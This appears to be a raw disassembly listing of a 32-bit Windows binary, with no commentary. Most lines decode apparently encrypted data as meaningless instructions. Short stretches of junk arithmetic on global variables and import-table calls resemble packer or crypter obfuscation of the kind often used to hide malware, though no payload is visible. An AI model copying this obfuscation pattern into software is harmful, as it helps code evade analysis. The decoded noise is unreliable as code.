  417d7d:	into   
  417d7e:	or     DWORD PTR [eax],esi
  417d80:	cmp    DWORD PTR [edx],ebx
  417d82:	push   0xffffff94
  417d84:	popf   
  417d85:	sub    DWORD PTR [edx+0x51],ebp
  417d88:	div    dh
  417d8a:	(bad)  
  417d8b:	xchg   ebx,eax
  417d8c:	pusha  
  417d8d:	cmp    edi,DWORD PTR [edx]
  417d8f:	fsubp  st(0),st
  417d91:	mov    BYTE PTR [ecx+0xd],0x4b
  417d95:	sbb    eax,0xe6cb8b59
  417d9a:	push   ecx
  417d9b:	test   DWORD PTR [esi+0x1ab40c46],0xed3108eb
  417da5:	cld    
  417da6:	jbe    0x417d56
  417da8:	or     edx,0x8518f3ed
  417dae:	add    eax,0x629500a7
  417db3:	push   ebp
  417db4:	add    DWORD PTR [ebx+0x1e],ecx
  417db7:	scas   al,BYTE PTR es:[edi]
  417db8:	and    al,0xa6
  417dba:	icebp  
  417dbb:	sub    BYTE PTR [edi-0x4018e6b8],dh
  417dc1:	push   esi
  417dc2:	xor    eax,0x59ae021
  417dc7:	mov    edx,0x1518026
  417dcc:	adc    DWORD PTR [edi+ecx*4],ebx
  417dcf:	inc    edx
  417dd0:	adc    edx,DWORD PTR [edx-0x56]
  417dd3:	cmp    esp,DWORD PTR [edi-0x2e]
  417dd6:	inc    ebp
  417dd7:	repnz adc al,0xb7
  417dda:	push   0xdabdb03f
  417ddf:	adc    bh,BYTE PTR [edx]
  417de1:	test   al,0xf8
  417de3:	add    ch,bl
  417de5:	(bad)  
  417de6:	jne    0x417dd0
  417de8:	jecxz  0x417e37
  417dea:	push   es
  417deb:	shr    DWORD PTR [esp+edi*2+0x21],1
  417def:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417df0:	or     eax,DWORD PTR [edx]
  417df2:	lods   eax,DWORD PTR ds:[esi]
  417df3:	xchg   edi,eax
  417df4:	push   ds
  417df5:	fdivr  st,st(1)
  417df7:	adc    ebx,eax
  417df9:	jne    0x417d9d
  417dfb:	imul   esp,DWORD PTR [ebp+0x3b4d602b],0xffffffb6
  417e02:	pop    ds
  417e03:	dec    ebx
  417e04:	or     DWORD PTR [edx],esp
  417e06:	(bad)  
  417e07:	shr    DWORD PTR [esi],cl
  417e09:	cs es aad 0xf
  417e0d:	mov    ebp,0xa197bdcf
  417e12:	imul   BYTE PTR [ebx]
  417e14:	popa   
  417e15:	out    0x9e,al
  417e17:	cmp    al,0x7f
  417e19:	sahf   
  417e1a:	jnp    0x417e33
  417e1c:	ret    
  417e1d:	lods   eax,DWORD PTR ds:[esi]
  417e1e:	push   ecx
  417e1f:	adc    ax,WORD PTR [ebx-0x3108c9d2]
  417e26:	or     al,dl
  417e28:	in     eax,0xdc
  417e2a:	cmp    al,BYTE PTR [ebx-0x2dfb22f0]
  417e30:	fidiv  DWORD PTR [edx+ecx*8+0x38]
  417e34:	cmp    eax,0x179857cc
  417e39:	jb     0x417dd7
  417e3b:	jno    0x417eb7
  417e3d:	push   ebx
  417e3e:	cmp    al,0xad
  417e40:	ins    BYTE PTR es:[edi],dx
  417e41:	push   0xcf911df5
  417e46:	daa    
  417e47:	call   0x74be24d3
  417e4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e4d:	xchg   ecx,eax
  417e4e:	aaa    
  417e4f:	or     ah,BYTE PTR [edi-0x14a61f53]
  417e55:	jae    0x417e8e
  417e57:	dec    eax
  417e58:	int3   
  417e59:	stc    
  417e5a:	call   0x48caead0
  417e5f:	dec    ecx
  417e60:	aas    
  417e61:	ins    DWORD PTR es:[edi],dx
  417e62:	ror    BYTE PTR [ebx],1
  417e64:	xchg   BYTE PTR [edi],dl
  417e66:	lock das 
  417e68:	iret   
  417e69:	xor    al,0xd9
  417e6b:	jnp    0x417ecb
  417e6d:	xchg   DWORD PTR [edi],ebx
  417e6f:	out    0xbb,al
  417e71:	jle    0x417e49
  417e73:	aaa    
  417e74:	add    ebx,0xc8cd0b06
  417e7a:	or     edi,ebp
  417e7c:	push   es
  417e7d:	inc    ebp
  417e7e:	jnp    0x417eda
  417e80:	adc    DWORD PTR [ebp+edi*2-0x3a],0x83b87895
  417e88:	pop    eax
  417e89:	mov    edi,0x4ceb3b94
  417e8e:	cmc    
  417e8f:	inc    esp
  417e90:	jb     0x417e2c
  417e92:	xor    al,0x42
  417e94:	mov    ss,WORD PTR [edi+0x31]
  417e97:	or     al,0x38
  417e99:	adc    DWORD PTR [esi-0x4d],ecx
  417e9c:	fist   WORD PTR [esi-0x538bcb51]
  417ea2:	ins    DWORD PTR es:[edi],dx
  417ea3:	out    dx,eax
  417ea4:	leave  
  417ea5:	das    
  417ea6:	and    eax,0xdffd848f
  417eab:	mov    DWORD PTR [ebx-0x7defaaa9],esp
  417eb1:	rol    edi,cl
  417eb3:	inc    esp
  417eb4:	and    al,0x3c
  417eb6:	aad    0x63
  417eb8:	add    BYTE PTR [eax],al
  417eba:	mov    DWORD PTR ds:0x4283af,0x432b
  417ec4:	mov    DWORD PTR [esp+0x30],0x169
  417ecc:	mov    DWORD PTR [esp+0x28],0x101b
  417ed4:	mov    DWORD PTR [esp+0x10],0x6bec
  417edc:	mov    eax,DWORD PTR [esp+0x10]
  417ee0:	mov    ecx,DWORD PTR [esp+0x28]
  417ee4:	sub    DWORD PTR ds:0x428273,0x4282cb
  417eee:	imul   eax,ecx
  417ef1:	or     eax,0x7f7d
  417ef6:	xor    eax,0xcf336131
  417efb:	cmp    DWORD PTR ds:0x4283c3,0x0
  417f02:	mov    ecx,0x3c6
  417f07:	mov    ecx,0x355d
  417f0c:	mov    ecx,0x21c7
  417f11:	jmp    0x41834c
  417f16:	mov    DWORD PTR ds:0x4282bf,0x1cb6
  417f20:	mov    DWORD PTR ds:0x4283bb,0x6ca2
  417f2a:	cmp    DWORD PTR ds:0x4283c3,0x0
  417f31:	jge    0x417f5f
  417f37:	push   DWORD PTR [ebp-0x1c]
  417f3a:	push   DWORD PTR [ebp-0x10]
  417f3d:	call   DWORD PTR ds:0x428ec8
  417f43:	sub    DWORD PTR ds:0x428297,0x19df
  417f4d:	xor    ecx,DWORD PTR ds:0x42827b
  417f53:	mov    ecx,DWORD PTR ds:0x4282db
  417f59:	and    DWORD PTR ds:0x4281d7,ecx
  417f5f:	xor    ecx,DWORD PTR ds:0x4283b3
  417f65:	mov    ecx,DWORD PTR ds:0x4281c7
  417f6b:	or     DWORD PTR ds:0x42835b,ecx
  417f71:	mov    ecx,DWORD PTR ds:0x4283df
  417f77:	or     DWORD PTR ds:0x4282c7,ecx
  417f7d:	jmp    0x41834c
  417f82:	jp     0x417fbc
  417f84:	lock adc al,0x9b
  417f87:	dec    esp
  417f88:	pop    edx
  417f89:	push   ds
  417f8a:	dec    esp
  417f8b:	retf   
  417f8c:	repnz push 0x7d
  417f8f:	dec    edx
  417f90:	jge    0x417f42
  417f92:	push   ebx
  417f93:	fst    DWORD PTR [esi]
  417f95:	sbb    BYTE PTR [edx+edx*1+0x12f11818],bh
  417f9c:	lahf   
  417f9d:	das    
  417f9e:	jl     0x417f35
  417fa0:	or     eax,0xe04dfafb
  417fa5:	jb     0x417fcb
  417fa7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417fa8:	stos   DWORD PTR es:[edi],eax
  417fa9:	mov    cl,ah
  417fab:	std    
  417fac:	or     eax,0xacff54fe
  417fb1:	rcl    BYTE PTR [ecx-0x3d82ce21],1
  417fb7:	ins    DWORD PTR es:[edi],dx
  417fb8:	adc    eax,0x6d81147f
  417fbd:	(bad)  [eax]
  417fbf:	sahf   
  417fc0:	push   ss
  417fc1:	sub    edx,DWORD PTR [eax+ebp*8-0x39cdfffb]
  417fc8:	leavew 
  417fca:	call   0x3fb02cdd
  417fcf:	xor    dh,BYTE PTR ds:0x1473c1f1
  417fd5:	pop    es
  417fd6:	adc    eax,0x9470ea6a
  417fdb:	xor    ebx,DWORD PTR [edx+edi*1-0x39]
  417fdf:	xor    BYTE PTR [esi-0x437b6ac6],0x1f
  417fe6:	cmp    eax,0xe0fc97a7
  417feb:	outs   dx,DWORD PTR ds:[esi]
  417fec:	mov    ah,0xd8
  417fee:	popa   
  417fef:	cmp    al,cl
  417ff1:	in     eax,0x68
  417ff3:	xchg   ebx,eax
  417ff4:	or     ebp,DWORD PTR [esi-0x6735ea87]
  417ffa:	stos   BYTE PTR es:[edi],al
  417ffb:	(bad)  
  417ffc:	ror    DWORD PTR [ebp-0x34a31794],cl
  418002:	dec    edi
  418003:	mov    edx,0x7910ebfc
  418008:	ds repz and eax,0xc6a8f117
  41800f:	jne    0x418088
  418011:	jl     0x418012
  418013:	sub    eax,0x427a5f83
  418018:	push   ebp
  418019:	ret    0xf978
  41801c:	or     esi,DWORD PTR [esi-0x378f4b19]
  418022:	adc    edx,DWORD PTR [edi-0x60]
  418025:	xchg   ebp,eax
  418026:	scas   eax,DWORD PTR es:[edi]
  418027:	lea    ebx,[ecx+0x77ee3204]
  41802d:	mov    ecx,0x1d90e7ea
  418032:	sahf   
  418033:	jbe    0x418061
  418035:	sub    BYTE PTR ds:0x5c1f2b96,dl
  41803b:	cmovs  eax,DWORD PTR [ebx+ebp*2]
  41803f:	cs jle 0x417fef
  418042:	loop   0x41803e
  418044:	sbb    ebx,edi
  418046:	adc    bh,BYTE PTR [esi-0x2d5a1b8b]
  41804c:	mov    bl,0x8c
  41804e:	pop    ebp
  41804f:	rcr    BYTE PTR [edx+0x26ac4f3b],1
  418055:	idiv   DWORD PTR [esi]
  418057:	pop    edx
  418058:	aas    
  418059:	out    dx,al
  41805a:	and    BYTE PTR [esp+esi*1-0x950e085],ah
  418061:	or     ecx,ecx
  418063:	push   0xffffff82
  418065:	mov    eax,0xa36cff1
  41806a:	mov    cl,ch
  41806c:	xor    DWORD PTR [edi+0x5b],eax
  41806f:	in     al,0x47
  418071:	jmp    esp
  418073:	mov    ds:0x41c85e63,al
  418078:	or     bl,BYTE PTR [edi+eax*4]
  41807b:	dec    edi
  41807c:	jmp    0x48149b0d
  418081:	sbb    bh,0xf8
  418084:	test   al,0x9b
  418086:	pop    es
  418087:	stos   DWORD PTR es:[edi],eax
  418088:	arpl   WORD PTR [ecx+0x1f],di
  41808b:	rcl    DWORD PTR [eax-0x47588768],cl
  418091:	repnz and DWORD PTR [edx+eiz*4+0x60c466cd],edx
  418099:	jp     0x4180f6
  41809b:	ss mov ecx,0xd091593d
  4180a1:	int3   
  4180a2:	out    dx,al
  4180a3:	dec    esp
  4180a4:	arpl   cx,di
  4180a6:	jge    0x41807a
  4180a8:	sti    
  4180a9:	cmp    al,0x3d
  4180ab:	or     cl,BYTE PTR [eax]
  4180ad:	out    dx,al
  4180ae:	sbb    al,0x6b
  4180b0:	adc    ecx,edi
  4180b2:	mov    eax,ds:0x38fb60fa
  4180b7:	fcmovb st,st(6)
  4180b9:	mov    BYTE PTR [ebx+ecx*4],bl
  4180bc:	clc    
  4180bd:	daa    
  4180be:	mov    esp,DWORD PTR [edi]
  4180c0:	in     eax,dx
  4180c1:	cmp    eax,0x8fd0615f
  4180c6:	mov    ebp,0x30deebc1
  4180cb:	in     eax,0x6e
  4180cd:	fild   QWORD PTR [eax+0x38325689]
  4180d3:	pop    ss
  4180d4:	and    DWORD PTR [eax+eiz*1-0x4e],0xffffffd7
  4180d9:	cld    
  4180da:	xchg   esp,eax
  4180db:	fwait
  4180dc:	(bad)  
  4180dd:	call   0x9b7e6df1
  4180e2:	jge    0x418142
  4180e4:	adc    BYTE PTR [edx],dl
  4180e6:	(bad)  
  4180e7:	adc    BYTE PTR [eax+0x37],ah
  4180ea:	ins    DWORD PTR es:[edi],dx
  4180eb:	out    dx,eax
  4180ec:	dec    edi
  4180ed:	mov    ebp,0x79983193
  4180f2:	xchg   esp,eax
  4180f3:	repnz in eax,dx
  4180f5:	mov    ebp,0x8875dce4
  4180fa:	pop    edx
  4180fb:	xor    eax,0x36ecaae5
  418100:	dec    esi
  418101:	bound  ebp,QWORD PTR [ebp-0x6f]
  418104:	cwde   
  418105:	add    bh,BYTE PTR [ebx+0x40]
  418108:	inc    ebp
  418109:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41810a:	and    cl,BYTE PTR [edx]
  41810c:	mov    ebx,0xa48ed8eb
  418111:	cmp    eax,DWORD PTR [ecx+ecx*4+0x27]
  418115:	aad    0xf0
  418117:	jno    0x41814a
  418119:	jg     0x418115
  41811b:	in     al,dx
  41811c:	and    ecx,DWORD PTR [edi-0x37ae028d]
  418122:	adc    ebx,DWORD PTR [ebp+0x70d8fb3d]
  418128:	xor    eax,0x7c2f5a27
  41812d:	loope  0x41811f
  41812f:	(bad)  
  418130:	xor    BYTE PTR [ecx+0x23ba859a],dh
  418136:	aad    0xb6
  418138:	inc    edi
  418139:	push   esi
  41813a:	inc    eax
  41813b:	mov    gs,ebx
  41813d:	jns    0x4180f7
  41813f:	push   ebp
  418140:	into   
  418141:	aad    0x32
  418143:	push   ds
  418144:	lods   eax,DWORD PTR ds:[esi]
  418145:	aam    0xa
  418147:	sbb    BYTE PTR [ecx],dh
  418149:	jl     0x41818b
  41814b:	sbb    BYTE PTR [ecx+0x7f],al
  41814e:	dec    ebx
  41814f:	fwait
  418150:	cld    
  418151:	push   esi
  418152:	js     0x418159
  418154:	jb     0x4181ae
  418156:	push   edi
  418157:	outs   dx,DWORD PTR ds:[esi]
  418158:	push   ebp
  418159:	ss add eax,0x5b9d5d81
  41815f:	jo     0x418131
  418161:	call   0x5c3720d8
  418166:	cmp    DWORD PTR [esp+eax*2+0x72529fad],0xc0b514db
  418171:	mov    edi,0x219899d4
  418176:	mov    ds:0x4e8f2702,al
  41817b:	addr16 jle 0x4181b5
  41817e:	inc    eax
  41817f:	mov    ebx,0xa4640c8d
  418184:	call   0x4778fe58
  418189:	inc    esi
  41818a:	aaa    
  41818b:	data16 and BYTE PTR [ecx+0x396f090c],dl
  418192:	sub    esi,DWORD PTR [esi+0x5f]
  418195:	addr16 int3 
  418197:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418198:	mov    ch,0xfc
  41819a:	lea    esp,[ebx+0x40b738ce]
  4181a0:	pop    edx
  4181a1:	jae    0x418157
  4181a3:	loop   0x41817f
  4181a5:	inc    eax
  4181a6:	jns    0x4181f8
  4181a8:	mov    eax,ds:0x3414072a
  4181ad:	arpl   WORD PTR [edi],ax
  4181af:	jmp    0x4e3972f1
  4181b4:	push   0xffffffb4
  4181b6:	pop    edi
  4181b7:	mov    edi,0x700af633
  4181bc:	cmp    eax,edi
  4181be:	adc    eax,ecx
  4181c0:	not    BYTE PTR [ecx-0x511e70fd]
  4181c6:	stos   BYTE PTR es:[edi],al
  4181c7:	scas   eax,DWORD PTR es:[edi]
  4181c8:	add    bh,bh
  4181ca:	dec    edx
  4181cb:	shl    BYTE PTR [esi+eax*8-0x1076e94a],0x92
  4181d3:	and    eax,0x26e38f79
  4181d8:	rcr    ch,0x40
  4181db:	mov    ch,0x85
  4181dd:	(bad)  
  4181de:	xor    bh,ah
  4181e0:	out    0x9,eax
  4181e2:	add    al,0xdd
  4181e4:	(bad)  [esi]
  4181e6:	push   DWORD PTR [ebx+eax*8]
  4181e9:	mov    eax,0x6cb1b3c9
  4181ee:	stos   BYTE PTR es:[edi],al
  4181ef:	sub    DWORD PTR [esi+edi*2],ecx
  4181f2:	shl    bl,0x21
  4181f5:	jnp    0x418266
  4181f7:	out    dx,eax
  4181f8:	add    BYTE PTR [esp+eiz*4-0x77a9e07e],dl
  4181ff:	sub    ecx,edx
  418201:	sbb    ebp,ebp
  418203:	and    BYTE PTR [eax+0x16],bl
  418206:	pop    ebx
  418207:	mov    DWORD PTR [eax],edx
  418209:	(bad)  
  41820a:	lock test DWORD PTR gs:[edx-0x6e],ecx
  41820f:	retf   0xbc4a
  418212:	leave  
  418213:	outs   dx,BYTE PTR ds:[esi]
  418214:	and    al,bh
  418216:	in     al,0x6a
  418218:	jo     0x41822f
  41821a:	xor    eax,0xabedbe64
  41821f:	ds dec ebx
  418221:	add    eax,0xd760bbec
  418226:	aam    0x4e
  418228:	sub    eax,0xc82c6108
  41822d:	fistp  QWORD PTR [edx-0x1b1a635c]
  418233:	int3   
  418234:	fbstp  TBYTE PTR [ebx+0x608ad70e]
  41823a:	cmp    edx,ebp
  41823c:	fmul   QWORD PTR [eax+ebx*4+0x2]
  418240:	outs   dx,DWORD PTR ds:[esi]
  418241:	(bad)  
  418242:	aad    0x56
  418244:	js     0x4182bb
  418246:	std    
  418247:	jmp    0x8aae5ade
  41824c:	pop    ss
  41824d:	inc    eax
  41824e:	stos   BYTE PTR es:[edi],al
  41824f:	pop    eax
  418250:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418251:	sbb    eax,0x387d32e9
  418256:	pop    ebx
  418257:	into   
  418258:	sub    BYTE PTR [edx-0x39],al
  41825b:	inc    edx
  41825c:	xchg   ecx,eax
  41825d:	add    BYTE PTR [ecx-0xa],ah
  418260:	jae    0x4182b5
  418262:	nop
  418263:	mov    dl,0x4c
  418265:	in     eax,0xce
  418267:	imul   ebx,DWORD PTR [ecx-0x7],0xc2788580
  41826e:	lods   eax,DWORD PTR ds:[esi]
  41826f:	push   ecx
  418270:	sbb    eax,0xa4b1e382
  418275:	fstp   st(3)
  418277:	jle    0x41823d
  418279:	xchg   edx,eax
  41827a:	pop    edx
  41827b:	test   BYTE PTR [esi],bl
  41827d:	dec    ebp
  41827e:	push   ss
  41827f:	(bad)  
  418280:	fsub   QWORD PTR [edx+0x5c]
  418283:	je     0x4182dc
  418285:	cld    
  418286:	addr16 sub al,0xf5
  418289:	int    0x82
  41828b:	sub    DWORD PTR [edi],ebx
  41828d:	icebp  
  41828e:	sbb    BYTE PTR [esi-0x25acf1aa],ch
  418294:	cmp    al,ch
  418296:	sti    
  418297:	stos   BYTE PTR es:[edi],al
  418298:	inc    edi
  418299:	sbb    esi,DWORD PTR [edx-0x58fe0ff9]
  41829f:	ins    DWORD PTR es:[edi],dx
  4182a0:	adc    BYTE PTR ds:0xc69a1fcf,0xf8
  4182a7:	iret   
  4182a8:	dec    esi
  4182a9:	jb     0x418271
  4182ab:	and    BYTE PTR [esi],0x89
  4182ae:	sbb    eax,0xb60c2eba
  4182b3:	out    0x36,al
  4182b5:	jno    0x4182e9
  4182b7:	or     al,0xb6
  4182b9:	adc    BYTE PTR [eax+eax*2-0x7a],bl
  4182bd:	jmp    0x1eee15f4
  4182c2:	leave  
  4182c3:	push   0x774d9ef4
  4182c8:	jmp    0xd87e:0xdb7733ea
  4182cf:	dec    edx
  4182d0:	sub    BYTE PTR [edi+edi*8],bh
  4182d3:	shr    BYTE PTR [edx],0xfe
  4182d6:	ja     0x418335
  4182d8:	pop    esp
  4182d9:	add    edi,DWORD PTR ds:[ebx+ebp*2]
  4182dd:	push   cs
  4182de:	shr    BYTE PTR [ecx-0x4f31818f],1
  4182e4:	(bad)  
  4182e5:	fwait
  4182e6:	out    0x27,al
  4182e8:	jmp    0x423083a
  4182ed:	pop    edi
  4182ee:	popa   
  4182ef:	retf   
  4182f0:	and    BYTE PTR [esi+ebp*8-0x60],0x87
  4182f5:	pop    es
  4182f6:	stos   BYTE PTR es:[edi],al
  4182f7:	jmp    0x21f4:0x4fcdbab2
  4182fe:	mov    eax,ds:0xa06590fd
  418303:	and    eax,DWORD PTR [ecx+0x575e6ddc]
  418309:	mov    cl,0xd7
  41830b:	mov    gs,WORD PTR [ecx+0x4d]
  41830e:	cs into 
  418310:	test   al,0x47
  418312:	scas   eax,DWORD PTR es:[edi]
  418313:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418314:	aaa    
  418315:	sar    BYTE PTR [edi],cl
  418317:	sub    al,0xe3
  418319:	sti    
  41831a:	loope  0x418309
  41831c:	lods   al,BYTE PTR ds:[esi]
  41831d:	in     eax,dx
  41831e:	dec    edx
  41831f:	ins    DWORD PTR es:[edi],dx
  418320:	pop    ss
  418321:	hlt    
  418322:	pop    edi
  418323:	iret   
  418324:	(bad)  
  418325:	adc    bh,BYTE PTR [ebx-0x7a4a57a8]
  41832b:	cwde   
  41832c:	cld    
  41832d:	sub    BYTE PTR [ebx+ebx*2],al
  418330:	add    ebp,0x72
  418333:	push   ebx
  418334:	out    0x8a,al
  418336:	add    al,bh
  418338:	pushf  
  418339:	adc    al,0x4c
  41833b:	fwait
  41833c:	scas   eax,DWORD PTR es:[edi]
  41833d:	push   esp
  41833e:	clc    
  41833f:	add    DWORD PTR [edx-0x42],eax
  418342:	and    BYTE PTR [edi-0x4e1dceea],ah
  418348:	retf   
  418349:	jmp    FWORD PTR [ebp-0x74cf00ab]
  41834f:	inc    esp
  418350:	and    al,0x34
  418352:	cmp    DWORD PTR ds:0x4281c7,0x0
  418359:	mov    DWORD PTR ds:0x42828b,0x42c6
  418363:	mov    DWORD PTR ds:0x4283c7,edx
  418369:	mov    DWORD PTR ds:0x4281a3,0x1d0
  418373:	jmp    0x4183cc
  418378:	mov    DWORD PTR ds:0x4282c7,0x243f
  418382:	mov    DWORD PTR ds:0x42829f,0x6875
  41838c:	cmp    DWORD PTR ds:0x4281c7,0x0
  418393:	ja     0x4183ba
  418399:	push   0x36f9
  41839e:	push   0x428363
  4183a3:	push   0x488c
  4183a8:	call   DWORD PTR ds:0x428ecc
  4183ae:	add    DWORD PTR ds:0x42832f,ecx
  4183b4:	add    ecx,DWORD PTR ds:0x4282b3
  4183ba:	xor    DWORD PTR ds:0x428367,edx
  4183c0:	mov    ecx,DWORD PTR ds:0x428343
  4183c6:	or     DWORD PTR ds:0x4281bf,ecx
  4183cc:	add    eax,0x75d9
  4183d1:	xor    DWORD PTR ds:0x42826b,ebx
  4183d7:	push   0xd
  4183d9:	not    ecx
  4183db:	pop    ecx
  4183dc:	xor    edx,edx
  4183de:	div    ecx
  4183e0:	mov    ecx,DWORD PTR [esp+0x40]
  4183e4:	xor    edx,edx
  4183e6:	xor    DWORD PTR ds:0x42826f,0x4281db
  4183f0:	or     eax,ecx
  4183f2:	mov    ecx,DWORD PTR [esp+0x44]
  4183f6:	xor    DWORD PTR ds:0x4281cf,0x28c0
  418400:	or     eax,ecx
  418402:	movzx  ecx,WORD PTR ds:0x4283cf
  418409:	or     DWORD PTR ds:0x4283c7,ecx
  41840f:	mov    ecx,DWORD PTR [esp+0x9c]
  418416:	sub    DWORD PTR ds:0x42819f,0x428367
  418420:	div    ecx
  418422:	xor    edx,edx
  418424:	xor    eax,0x680da048
  418429:	cmp    DWORD PTR ds:0x42826b,0x0
  418430:	mov    DWORD PTR ds:0x42827b,0x43af
  41843a:	mov    ecx,0x1f20
  41843f:	jmp    0x418491
  418444:	mov    DWORD PTR ds:0x4283c3,0x5a59
  41844e:	cmp    DWORD PTR ds:0x42826b,0x0
  418455:	jl     0x41847f
  41845b:	push   0x4280c3
  418460:	push   0x400000
  418465:	call   DWORD PTR ds:0x428e28
  41846b:	sbb    DWORD PTR ds:0x4282af,0x4c8f
  418475:	mov    DWORD PTR ds:0x4281a7,0x386a
  41847f:	or     ecx,DWORD PTR ds:0x4283c3
  418485:	xor    ecx,DWORD PTR ds:0x42832b
  41848b:	or     ecx,0x6bea
  418491:	push   DWORD PTR [eax]
  418493:	mov    eax,DWORD PTR [esp+0x94]
  41849a:	or     DWORD PTR ds:0x4283c7,ecx
  4184a0:	mov    ecx,DWORD PTR [esp+0x5c]
  4184a4:	xor    DWORD PTR ds:0x42833f,0x4282ab
  4184ae:	push   DWORD PTR ds:0x4facd31
  4184b4:	add    eax,0xb4a
  4184b9:	and    DWORD PTR ds:0x4283e7,0x42826f
  4184c3:	push   DWORD PTR ds:0x1e6ebff7
  4184c9:	or     DWORD PTR ds:0x42833b,0x5053
  4184d3:	imul   eax,ecx
  4184d6:	push   DWORD PTR [eax-0x3f17647c]
  4184dc:	mov    eax,DWORD PTR [esp+0x60]
  4184e0:	adc    ecx,0x139f
  4184e6:	jmp    0x4188b5
  4184eb:	and    eax,0x8fa5979d
  4184f0:	sbb    esp,DWORD PTR [ebx]
  4184f2:	sbb    eax,0x7edf00c8
  4184f7:	mov    edi,0xf66a040d
  4184fc:	rcl    DWORD PTR [esi],1
  4184fe:	sbb    BYTE PTR [edx+edx*1+0xde71818],bh
  418505:	shr    DWORD PTR [eax],0xd9
  418508:	in     al,dx
  418509:	xchg   ebp,eax
  41850a:	cdq    
  41850b:	jae    0x4184c5
  41850d:	imul   ecx,DWORD PTR [eax+edi*4],0x918b9ec7
  418514:	dec    edi
  418515:	jmp    0x51873a19
  41851a:	call   0x5a703d63
  41851f:	xchg   edx,eax
  418520:	xor    ah,BYTE PTR [edi-0x409bde73]
  418526:	dec    eax
  418527:	jecxz  0x4184e3
  418529:	out    dx,al
  41852a:	add    cl,BYTE PTR [ecx]
  41852c:	sub    DWORD PTR [ecx+0x255f5a84],edx
  418532:	xor    DWORD PTR [eax+0x3b0edfff],esi
  418538:	jns    0x4184cc
  41853a:	sti    
  41853b:	fs pop edx
  41853d:	std    
  41853e:	xchg   ebx,eax
  41853f:	es inc esi
  418541:	fs add al,0x44
  418544:	lock add al,0x54
  418547:	ja     0x41852f
  418549:	dec    ebx
  41854a:	add    edx,edx
  41854c:	mov    ebx,0x679221d8
  418551:	imul   edi,DWORD PTR [eax-0x201c4b56],0xd1ac0c87
  41855b:	out    0x68,eax
  41855d:	retf   
  41855e:	jnp    0x41853c
  418560:	push   ebp
  418561:	adc    DWORD PTR [edx+edi*2],eax
  418564:	out    0xa,al
  418566:	jnp    0x41851e
  418568:	or     BYTE PTR [ebp+ebx*2-0x7e4a25d8],ah
  41856f:	mov    ah,0x7f
  418571:	ds fsubp st(5),st
  418574:	sahf   
  418575:	jns    0x4185af
  418577:	fstp   TBYTE PTR [ecx-0x17]
  41857a:	cmp    edx,DWORD PTR [ecx]
  41857c:	das    
  41857d:	cli    
  41857e:	in     al,0xf5
  418580:	add    al,0x85
  418582:	pop    edi
  418583:	es shr esi,1
  418586:	rcl    BYTE PTR ds:0x99d1904d,0xf7
  41858d:	shl    al,cl
  41858f:	and    DWORD PTR [edx-0x76a2cef8],ebx
  418595:	add    cl,BYTE PTR [eax]
  418597:	dec    eax
  418598:	push   es
  418599:	mov    cl,0xa
  41859b:	jle    0x41854f
  41859d:	stos   BYTE PTR es:[edi],al
  41859e:	(bad)  
  41859f:	retf   
  4185a0:	sbb    eax,0x3d0ca93a
  4185a5:	or     al,0xec
  4185a7:	lods   al,BYTE PTR ds:[esi]
  4185a8:	xchg   ebp,eax
  4185a9:	xor    DWORD PTR [ebp-0x70],eax
  4185ac:	jmp    0x974c:0xe923caaa
  4185b3:	fdiv   QWORD PTR [ebx+eax*8]
  4185b6:	xor    ebx,edx
  4185b8:	jbe    0x4185ba
  4185ba:	test   DWORD PTR [ebx+0x63],0x783fafc0
  4185c1:	xor    DWORD PTR [esi-0x62d53ab],esp
  4185c7:	cmp    BYTE PTR [ecx+edi*4-0x4af9a8bc],cl
  4185ce:	pop    ds
  4185cf:	xlat   BYTE PTR ds:[ebx]
  4185d0:	or     dh,BYTE PTR [ecx+0x4a62697a]
  4185d6:	cld    
  4185d7:	mov    ebp,0x1db9309
  4185dc:	or     eax,0xd3d3e043
  4185e1:	loopne 0x41864e
  4185e3:	(bad)  
  4185e4:	mov    edx,0x411a48f6
  4185e9:	jecxz  0x4185f0
  4185eb:	(bad)  
  4185ec:	push   esi
  4185ed:	ins    DWORD PTR es:[edi],dx
  4185ee:	dec    edi
  4185ef:	jb     0x418633
  4185f1:	add    BYTE PTR [edi],al
  4185f3:	daa    
  4185f4:	test   al,0x65
  4185f6:	lock pushf 
  4185f8:	cmp    al,0xb6
  4185fa:	cmp    dl,dh
  4185fc:	xchg   esi,eax
  4185fd:	push   esp
  4185fe:	sar    BYTE PTR [ecx-0x45f774c7],cl
  418604:	sahf   
  418605:	push   ecx
  418606:	mov    ds:0x5a163c24,al
  41860b:	mov    esi,0xd2435c83
  418610:	hlt    
  418611:	mov    ds:0x164ddf6b,al
  418616:	add    WORD PTR [edi+ebp*1+0x34],si
  41861b:	xchg   edx,eax
  41861c:	push   cs
  41861d:	mov    al,ds:0x6ed7e775
  418622:	xor    eax,0x93de8f3e
  418627:	add    al,0x86
  418629:	xlat   BYTE PTR ds:[ebx]
  41862a:	mov    dh,0x5e
  41862c:	(bad)  
  41862d:	(bad)  
  41862e:	jge    0x41861d
  418630:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418631:	dec    ecx
  418632:	dec    edi
  418633:	mov    WORD PTR [edx+0x23edb77f],gs
  418639:	cwde   
  41863a:	enter  0x6da,0x19
  41863e:	mov    ds:0x6b175230,al
  418643:	xor    DWORD PTR [ecx+0x35],esp
  418646:	dec    esp
  418647:	call   0xc074:0xbc492282
  41864e:	fcomp  QWORD PTR [ebx+0x6d]
  418651:	push   ebp
  418652:	fwait
  418653:	pop    eax
  418654:	scas   al,BYTE PTR es:[edi]
  418655:	cld    
  418656:	loop   0x4186ad
  418658:	cmp    BYTE PTR [edi+0x3fdb62bf],dl
  41865e:	popf   
  41865f:	sub    edx,DWORD PTR [ebp-0x6c39e409]
  418665:	je     0x4186e5
  418667:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418668:	gs sbb edx,edx
  41866b:	popa   
  41866c:	dec    esi
  41866d:	mov    ebp,0x6d4cf324
  418672:	and    ch,BYTE PTR [ebx]
  418674:	push   edx
  418675:	repnz inc ebp
  418677:	das    
  418678:	xchg   esi,eax
  418679:	xor    edx,eax
  41867b:	inc    esi
  41867c:	imul   edx,ebx,0x4df6da0b
  418682:	lock adc DWORD PTR [ebp+0x439e50fa],edi
  418689:	iret   
